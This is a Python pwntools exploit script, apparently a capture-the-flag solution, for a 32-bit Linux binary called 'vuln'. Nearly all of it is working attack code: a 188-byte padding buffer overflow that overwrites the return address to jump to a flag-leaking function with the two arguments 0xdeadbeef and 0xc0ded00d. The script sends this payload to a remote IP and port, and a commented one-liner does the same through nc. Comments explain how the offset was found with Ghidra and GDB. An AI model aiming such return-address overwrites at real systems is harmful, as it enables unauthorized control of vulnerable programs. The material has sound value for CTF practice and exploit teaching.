from pwn import *

context.update(arch='i386', os='linux')

elf = ELF('./vuln')
#p = elf.process()
p = remote('138.68.186.32',30081)

offset = 180+8 #Leaked from dmesg OR
#Use Ghidra to see the return address value.
#Calculate from GDB by setting breakpoint before read to see address location of return address.
#Pass input and set breakpoint after read to see address location of input.
#0xffffd24d - 0xffffd190 = 0xBD (189)
#This mean that 189th byte is to overwrite return address

flag_address = b'\xe2\x91\x04\x08' #Found in Ghidra, function to leak flag
ret_address = b'\x72\x92\x04\x08' #After going to the flag_address, it will be popped from stack. No return address left, so we need to set a pseudo return address to ensure the following two arguments are properly offset in the stack.
arg_1 = b'\xef\xbe\xad\xde' #The two arguments used in CMP found in Ghidra.
arg_2 = b'\x0d\xd0\xde\xc0'

#STACK BEFORE VS AFTER

# arg_2           |   arg_2
# arg_1           |   arg_1
# ret_address     |   ret_address
# flag_address    |   AAAAA..
# AAAAA..         |


payload = [
    b'A'*offset,
    flag_address,
    ret_address,
    arg_1,
    arg_2
]

payload = b''.join(payload)
print(payload)

p.sendline(payload)
p.interactive()

#commandline exploit
#python2 -c "print(b'A'*188+b'\xe2\x91\x04\x08'+b'\x72\x92\x04\x08'+b'\xef\xbe\xad\xde'+b'\x0d\xd0\xde\xc0')" | nc 138.68.186.32 30081

